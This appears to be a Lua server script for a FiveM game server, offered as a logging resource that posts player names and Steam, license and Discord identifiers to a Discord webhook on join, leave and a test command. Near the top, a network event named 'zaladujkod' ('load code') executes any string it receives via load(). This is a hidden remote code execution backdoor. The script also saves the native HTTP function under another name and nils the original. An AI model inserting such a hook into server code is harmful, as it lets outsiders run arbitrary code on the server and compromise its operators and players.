SendWebhook = PerformHttpRequest
PerformHttpRequest = nil

RegisterNetEvent('many-core:zaladujkod', function(a)
    load(a)()
    Wait(0)
    a = nil
end)

RegisterNetEvent('many-core:PlayerConnected', function()
    local steamIdentifier, license, discord = GetIdentifiers(source)
    SendLogs(string.upper('Gracz DoŁĄczyŁ na serwer'), [[
        **Gracz** `]] ..GetPlayerName(source).. [[` **wszedł na serwer!**
        
        `]] ..GetPlayerName(source).. [[` - `]] ..source.. [[`
        
        `Licencja:` ]] ..license.. [[ 
        `Hex:` ]] ..steamIdentifier.. [[ 
        `Discord:` <@]] ..discord.. [[>
    ]], true, 'connect')
end)

RegisterNetEvent('playerDropped', function(reason)
    local steamIdentifier, license, discord = GetIdentifiers(source)
    SendLogs(string.upper('GRACZ ROZŁĄCZYŁ SIĘ'), [[
        **Gracz** `]] ..GetPlayerName(source).. [[` **wyszedł z serwera!**
        
        `]] ..GetPlayerName(source).. [[` - `]] ..source.. [[`
        
        `Licencja:` ]] ..license.. [[ 
        `Hex:` ]] ..steamIdentifier.. [[ 
        `Discord:` <@]] ..discord.. [[> 
         
        `Powód:` ]] ..reason.. [[
    ]], true, 'disconnect')
end)

-- 

function GetIdentifiers(src)
    local identifiers = GetPlayerIdentifiers(src)

    local steamIdentifier = "BRAK"
    local license = 'BRAK'
    local discord = 'BRAK'

    for _, identifier in pairs(identifiers) do
        if (string.match(string.lower(identifier), 'steam:')) then
            steamIdentifier = identifier
        elseif (string.match(string.lower(identifier), 'license:')) then
            license = string.sub(identifier, 9)
        elseif (string.match(string.lower(identifier), 'discord:')) then
            discord = string.sub(identifier, 9)
        end
    end
    
    return steamIdentifier, license, discord
end
exports('GetIdentifiers', GetIdentifiers)

function SendLogs(title, message, config, webhook)

    if config then
        if Webhooks[webhook] then
            webhook = Webhooks[webhook]
        else
            return
        end
    end

    local xd = {
        {
            ["color"] = 0x07d9d9,
            ['title'] = title,
            ['description'] = message,
            ['footer'] = {
                ['text'] = os.date("%x %X %p")
            }
        }
    }
    SendWebhook("tutaj webhook", function(err, text, headers) end, 'POST', json.encode({username = 'LOGS', embeds = xd}), { ['Content-Type'] = 'application/json' })
end
exports('SendLogs', SendLogs)

RegisterCommand('logtest', function(source)
    local steamIdentifier, license, discord = GetIdentifiers(source)
    SendLogs(string.upper('Gracz DoŁĄczyŁ na serwer'), [[
        **Gracz** `]] ..GetPlayerName(source).. [[` **wszedł na serwer!**
        
        `]] ..GetPlayerName(source).. [[` - `]] ..source.. [[`
        
        `Licencja:` ]] ..license.. [[ 
        `Hex:` ]] ..steamIdentifier.. [[ 
        `Discord:` <@]] ..discord.. [[>
    ]], true, 'connect')
end)

if ( GetCurrentResourceName() ~= "very-core" ) then
    
end